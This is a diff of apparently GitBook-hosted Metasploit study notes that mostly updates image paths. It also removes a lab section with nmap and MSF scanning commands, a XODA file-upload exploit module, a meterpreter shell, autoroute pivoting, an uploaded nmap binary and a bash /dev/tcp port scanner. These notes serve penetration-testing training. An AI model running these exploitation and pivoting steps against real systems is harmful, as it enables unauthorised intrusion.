@@ -52,7 +52,7 @@
 
 🗒️ **Metasploit Framework Console** ([**MSFconsole**](https://www.offsec.com/metasploit-unleashed/msfconsole/)) - an all in one interface that provides with access to all the functionality of the MSF.
 
-<figure><img src="../../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>
 
 🗒️ **Metasploit Framework Command Line Interface** ([**MSFcli**](https://www.offsec.com/metasploit-unleashed/msfcli/)) - a command line utility used to facilitate the creation of automation scripts that utilize Metasploit modules.
 
@@ -60,7 +60,7 @@
 
 🗒️ **Metasploit Community Edition GUI** - a web based GUI front-end of the MSF.
 
-<figure><img src="../../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>
 
 🗒️ [**Armitage**](https://www.kali.org/tools/armitage/) - a free Java based GUI front-end cyber attack management tool for the MSF.
 
@@ -68,11 +68,11 @@
 * Recommends exploits
 * Exposes the advanced capabilities of the MSF
 
-<figure><img src="../../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>
 
 ### [Architecture](https://www.offsec.com/metasploit-unleashed/metasploit-architecture/)
 
-<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>
 
 🗒️ A **module** is the piece of code that can be utilized and executed by the MSF.
 
@@ -152,7 +152,7 @@ ls /usr/share/metasploit-framework
 >
 > 📌 **Reporting**
 
-<figure><img src="../../../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>
 
 <table><thead><tr><th width="275" align="center">Pentesting Phase</th><th>MSF Implementation</th></tr></thead><tbody><tr><td align="center"><strong>Information Gathering &#x26; Enumeration</strong></td><td>Auxiliary Modules, <code>nmap</code> reports</td></tr><tr><td align="center"><strong>Vulnerability Scanning</strong></td><td>Auxiliary Modules, <code>nessus</code> reports</td></tr><tr><td align="center"><strong>Exploitation</strong></td><td>Exploit Modules &#x26; Payloads</td></tr><tr><td align="center"><strong>Post Exploitation</strong></td><td>Meterpreter</td></tr><tr><td align="center"><strong>Privilege Escalation</strong></td><td>Post Exploitation Modules, Meterpreter</td></tr><tr><td align="center"><strong>Maintaining Persistent Access</strong></td><td>Post Exploitation Modules, Persistence</td></tr></tbody></table>
 
@@ -332,204 +332,11 @@ workspace -d Test
 
 ***
 
-## Information Gathering & Enumeration with MSF <a href="#information-gathering-and-enumeration-with-msf" id="information-gathering-and-enumeration-with-msf"></a>
-
-* The Metasploit Framework allows to import `nmap` results.
-
-### Nmap Enumeration <a href="#nmap-enumeration" id="nmap-enumeration"></a>
-
-**`nmap`** enumeration results (_service versions, operating systems, etc_) can be exported into a file that can be imported into MSF and used for further detection and exploitation.
 
 
 
-Some commands:
 
-```bash
-nmap <TARGET_IP>
-nmap -Pn <TARGET_IP>
-nmap -Pn -sV -O <TARGET_IP>
-```
 
-* Output the `nmap` scan results into an **`.XML`** format file that can be imported into MSF
 
-```bash
-nmap -Pn -sV -O 10.2.18.161 -oX windows_server_2012
-```
 
-### [MSFdb Import](https://www.offsec.com/metasploit-unleashed/using-databases/) <a href="#msfdb-import" id="msfdb-import"></a>
-
-* In the same lab environment from above, use `msfconsole` to import the results into MSF with the `db_import` command
-
-```bash
-service postgresql start
-msfconsole
-```
-
-* Inside `msfconsole`
-
-```bash
-db_status
-workspace -a Win2k12
-db_import /root/windows_server_2012
-```
-
-<figure><img src="../../../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>
-
-* Perform an `nmap` scan _within the MSF Console and import the results in a dedicated workspace_
-
-```bash
-workspace -a nmap_MSF
-```
-
-```bash
-db_nmap -Pn -sV -O <TARGET_IP>
-```
-
-<figure><img src="../../../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>
-
-### [Port Scanning](https://www.offsec.com/metasploit-unleashed/port-scanning/) <a href="#port-scanning" id="port-scanning"></a>
-
-MSF **Auxiliary modules** are used during the information gathering (similar to `nmap`) and the post exploitation phases of the pentest.
-
-* perform TCP/UDP port scanning
-* enumerate services
-* discover hosts on different network subnets (post-exploitation phase)
-
-**Lab Network Service Scanning**
-
-> 🔬 Lab [T1046 : Network Service Scanning](https://attackdefense.com/challengedetails?cid=1869)
-
-```bash
-service postgresql start && msfconsole -q
-```
-
-```bash
-workspace -a Port_scan
-search portscan
-use auxiliary/scanner/portscan/tcp
-set RHOSTS 192.41.167.3
-run
-```
-
-<figure><img src="../../../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>
-
-```bash
-curl 192.41.167.3
-```
-
-<figure><img src="../../../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>
-
-* Exploitation
-
-```bash
-search xoda
-use exploit/unix/webapp/xoda_file_upload
-set RHOSTS 192.41.167.3
-set TARGETURI /
-run
-```
-
-<figure><img src="../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>
-
-* Perform a network scan on the second target
-
-```bash
-meterpreter > shell
-```
-
-```bash
-/bin/bash -i
-ifconfig
-exit
-```
-
-<figure><img src="../../../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>
-
-* Add the route within `meterpreter` and background the meterpreter session
-
-```bash
-run autoroute -s 192.26.158.2
-background
-```
-
-<figure><img src="../../../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>
-
-```bash
-search portscan
-use auxiliary/scanner/portscan/tcp
-set RHOSTS 192.26.158.3
-run
-```
-
-<figure><img src="../../../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>
-
-* Check the static binaries available in "`/root/tools/static-binaries`" directory
-
-```bash
-ls -l /root/tools/static-binaries
-```
-
-<figure><img src="../../../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>
-
-* Upload and run `nmap` against the second target, from the first target machine
-
-```
-sessions 1
-upload /root/tools/static-binaries/nmap /tmp/nmap
-shell
-```
-
-```
-/bin/bash -i
-cd /tmp
-chmod +x ./nmap
-./nmap -p- 192.26.158.3
-```
-
-<figure><img src="../../../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>
-
-<figure><img src="../../../.gitbook/assets/image (181).png" alt=""><figcaption></figcaption></figure>
-
-#### Addtional
-
-* Create and use the bash script to scan the second target machine.
-
-> Using the script provided at [`https://catonmat.net/tcp-port-scanner-in-bash`](https://catonmat.net/tcp-port-scanner-in-bash) as a reference, create a bash script to scan first 1000 ports
-
-```bash
-vim bash-port-scanner.sh
-cat bash-port-scanner.sh
-```
-
-```bash
-Bash Script:
-#!/bin/bash
-for port in {1..1000}; do
-timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
-done
-```
-
-* Navigate to `meterpreter` sessions.
-
-```bash
-upload /root/tools/static-binaries/nmap /tmp/nmap
-upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
-```
-
-```bash
-cd /tmp/
-chmod +x ./nmap ./bash-port-scanner.sh
-./bash-port-scanner.sh 192.26.158.3
-```
-
-#### **UDP Scan**
-
-* Into `msfconsole`
-
-```bash
-search udp_sweep
-use auxiliary/scanner/discovery/udp_sweep
-set RHOSTS 192.41.167.3
-run
-```
 
